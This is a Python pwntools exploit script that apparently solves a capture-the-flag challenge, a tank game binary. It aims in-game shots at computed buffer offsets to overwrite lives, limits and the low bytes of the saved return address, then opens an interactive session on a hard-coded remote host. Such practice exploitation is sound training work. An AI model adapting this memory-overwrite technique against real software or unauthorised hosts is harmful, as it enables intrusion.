import pwn
import numpy as np

#constants
g = 9.81
angle_45 = 45
rad_angle_45 = np.pi * (angle_45 / 180)

#dist from game_buf
ammo_check_dist = 0x1a0 - 0x88 #positive
dist_to_ret = 0x88 + 0x8
dist_to_misses = 0x1b4 - 0x88
dist_to_hit_crate =  0x174 - 0x88

#distance from ammo type array
dist_to_chosen_byte = 8 + 1 #dist to user inserted byte


def send_shot(p, a):
    r.sendline(str(p).encode('latin'))
    r.sendline(str(a).encode('latin'))
    r.sendline(b"pew!")


#calculate power and angle to send a shot to index = dist
def send_shot_to_pos(dist):
    test = False
    if(dist < 0):
        test = True
        dist = -dist
    
    a = angle_45 #calculate power when angle = 45 degrees
    p =  np.sqrt( (dist * g) / (2*np.sin(rad_angle_45)*np.cos(rad_angle_45) ) )
    
    if(test):
        a = a + 270

    send_shot(p + 0.001, a) #add 0.001 to fix rounding issues

#solve distance
def get_special_ammo():
    for i in range(3):
        r.readuntil(b"|\"\"\"\-=  ", timeout=0.2)
        field = r.readline()
        dist = field.decode('latin').find("E")
        send_shot_to_pos(dist) #will break if dist = 111
        
        if b"hit" not in r.readuntil(b"Direct hit", timeout=0.2):
            print("ERROR in get_special_ammo")

def pick_special_ammo(index):
    r.sendline(str(index).encode('latin'))

def send_byte_to_pos(byte, pos):
    #place byte on stack
    pick_special_ammo(1) #regular ammo
    r.sendline(str(0).encode('latin'))
    r.sendline(str(angle_45).encode('latin'))
    r.sendline(b"pew!aa" + byte)
    r.sendline(b"pew!")
    
    #shoot byte
    pick_special_ammo(dist_to_chosen_byte)
    send_shot_to_pos(pos)

def main():
    
    #get special ammo
    get_special_ammo() 
    pick_special_ammo(2) #pick explosive shot
   
    #set max_power to 45
    send_shot(33, angle_45) #send shot to end, can't use send_shot_to_pos
    
    #set max_power to large value
    send_shot_to_pos(0x70 + 1)

    #set max angle to val > 360
    get_special_ammo()
    pick_special_ammo(2) #pick explosive shot
    send_shot_to_pos(0) #send to beginning

    #set lives to large number
    send_shot_to_pos(-dist_to_misses)
    
    #change ammo input check variable
    send_shot_to_pos(-ammo_check_dist + 1)
    
    #always have special ammo
    send_shot_to_pos(-dist_to_hit_crate)


    #set LSB byte
    send_byte_to_pos(b"\xe3", dist_to_ret)
    print("LSB byte set")

    #set second LSB byte
    send_byte_to_pos(b"\x13", dist_to_ret + 1)
    print("Second LSB byte set")
    
    #set lives to 1 
    send_byte_to_pos(b"\x04", -dist_to_misses)
    
    r.interactive()

#r = pwn.process("./super-sick-tank-game")
r = pwn.process("nc 184.72.87.9 8004", shell=True)
main()

